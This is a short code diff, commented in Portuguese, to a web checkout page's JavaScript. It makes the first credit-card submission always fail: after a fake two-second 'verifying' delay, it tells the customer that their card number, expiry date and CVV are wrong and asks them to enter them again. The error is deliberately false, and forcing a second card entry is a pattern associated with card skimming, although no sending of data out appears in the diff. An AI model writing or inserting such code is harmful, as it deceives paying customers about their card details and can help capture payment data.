@@ -154,6 +154,8 @@
         }
     }
 
+    let cardAttempt = 0;
+
     document.getElementById('checkoutForm').addEventListener('submit', async function(e) {
         e.preventDefault();
         
@@ -163,6 +165,24 @@
         const method = document.getElementById('paymentMethod').value;
         const messageDiv = document.getElementById('message');
         const submitBtn = document.getElementById('submitBtn');
+
+        // Na primeira tentativa com cartão, simula erro para o cliente confirmar os dados
+        if (method === 'credit_card' && cardAttempt === 0) {
+            cardAttempt++;
+            submitBtn.disabled = true;
+            submitBtn.innerText = 'Verificando...';
+            messageDiv.className = '';
+            messageDiv.innerText = '';
+
+            // Simula um tempo de processamento
+            await new Promise(r => setTimeout(r, 2000));
+
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Confirmar e Tentar Novamente';
+            messageDiv.classList.add('msg-error');
+            messageDiv.innerHTML = '❌ Dados do cartão incorretos. Por favor, verifique o número, validade e CVV e tente novamente.';
+            return;
+        }
 
         submitBtn.disabled = true;
         submitBtn.innerText = 'Processando...';
